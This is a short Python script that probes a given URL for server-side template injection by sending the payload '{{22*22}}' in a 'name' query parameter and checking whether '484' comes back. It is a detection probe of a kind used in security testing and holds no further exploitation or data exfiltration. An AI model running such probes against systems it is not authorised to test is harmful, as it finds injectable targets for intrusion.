import requests,sys


def verity(url):
    path = '/?name='
    payload = '{{22*22}}'
    target = url+path+payload
    res = requests.get(target)
    if '484' in res.text:
        print("[+]%s is vulnerable" % url)
    else:
        print("[+]%s is not vulnerable" % url)


if __name__ == '__main__':
    args = sys.argv
    if len(args) == 2:
        url = args[1]
        verity(url)
    else:
        print("Usage: python %s url" % args[0])